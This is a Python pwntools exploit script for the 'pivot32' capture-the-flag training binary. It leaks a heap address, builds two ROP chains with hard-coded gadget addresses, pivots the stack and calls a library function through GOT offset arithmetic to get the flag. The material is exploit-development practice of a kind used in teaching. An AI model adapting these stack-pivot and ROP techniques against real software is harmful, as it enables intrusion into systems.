#/usr/bin/env python
from pwn import *

context.binary = './pivot32'
#context.log_level ='debug'

io = process('./pivot32')
elf =ELF('./pivot32')
libc_pivot32 = ELF('./libpivot32.so')
command = '/bin/sh\x00'

def build_frist_rop_chain(heapaddr):
	payload = 'A'*(0x28+4)
	payload += p32(0x80488C0)
	payload += p32(heapaddr)
	payload += p32(0x80488C2)
	io.sendline(payload)

def build_second_rop_chain():
	io.recvuntil('\n> ')
	payload = p32(elf.plt['foothold_function'])   #binging to GOT
	payload += p32(0x80488C0)        #pop eax ret;
	payload += p32(elf.got['foothold_function'])
	payload += p32(0x80488C4)        #mov eax,[eax] ret;
	payload += p32(0x08048571)       #pop rbx ret;
	payload += p32(0x967-0x770)       
	payload += p32(0x80488C7)        #add eax,ebx ret;
	payload += p32(0x08048a5f)       #jmp eax;
	payload += 'AAAA'*4
	io.sendline(payload)

#leak heap address
io.recvuntil('pivot: ')
heapaddr = io.recvuntil('\n',drop =True)
heapaddr = int(heapaddr,16)
log.info('addr:'+hex(heapaddr))

build_second_rop_chain()
build_frist_rop_chain(heapaddr)
flag = io.recvline()
log.info('flag:'+flag)

io.interactive()
